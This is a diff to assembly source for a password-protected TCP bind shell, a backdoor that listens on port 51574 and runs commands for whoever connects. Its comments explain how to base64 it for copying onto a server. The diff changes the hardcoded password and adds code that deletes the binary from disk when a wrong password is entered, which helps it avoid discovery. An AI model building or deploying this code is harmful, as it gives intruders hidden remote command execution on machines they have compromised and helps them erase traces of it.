@@ -1,20 +1,22 @@
 ; TCP BIND SERVER
 ; compile with
-; nasm -f out -o ts tcp-serv.asm
-; the resulting ts file is the whole executable
-; "cat ts | base64" in order to copy to some server
+; nasm -f out -o t tcp-serv.asm
+; the resulting t file is the whole executable
+; "cat t | base64" in order to copy to some server
 ; default listens on port 51574
 ; in order to change port:
 ;   python3
 ;   >>> import socket
 ;   >>> PORT = 51574 # change this to your port!
 ;   >>> hex(socket.htons(PORT))+'0002' # this will output the value you need to insert into the PORTANDFAMILY variable
+FILENAME            equ 't' ; change this if you compile with a different filename
+                            ; the program deletes the server with this filename
 ; default pass is "m4D$"
 %define USEPASSWORD ; comment this if you don't want password
 ; password for login, if password is invalid at any point then we exit
 ; password MUST be 4 bytes long, it's unbrutable anyway, done this way for easier checking
-PASSWORD           equ 'm4D$'
-PORTANDFAMILY      equ 0x76c90002 ; port is 51574, so the first half is htons(port), second is AF_INET
+PASSWORD            equ 't7/]'
+PORTANDFAMILY       equ 0x76c90002 ; port is 51574, so the first half is htons(port), second is AF_INET
 
 ; when you connect, simply enter password and press enter
 ; then enter the command
@@ -75,6 +77,7 @@ SYS_SETSOCKOPT      equ 0x36
 SYS_FORK            equ 0x39
 SYS_EXECVE          equ 0x3b
 SYS_EXIT            equ 0x3c
+SYS_UNLINK          equ 0x57
 
 ; file opening
 O_RDWR              equ 0x2
@@ -190,7 +193,7 @@ password_check:
         xor eax, eax                        ; SYS_READ = 0
         syscall
         cmp dword [rsp], PASSWORD
-        jne exitserver
+        jne stopserver
 %endif
         mov al, SYS_FORK
         syscall
@@ -235,7 +238,13 @@ exec_shell:
 
         mov al, SYS_EXECVE                  ; finally call execve in child
         syscall
-        
+
+stopserver:
+        push FILENAME
+        push rsp
+        pop rdi
+        mov al, SYS_UNLINK
+        syscall
 exitserver:
         mov al, SYS_EXIT
         syscall
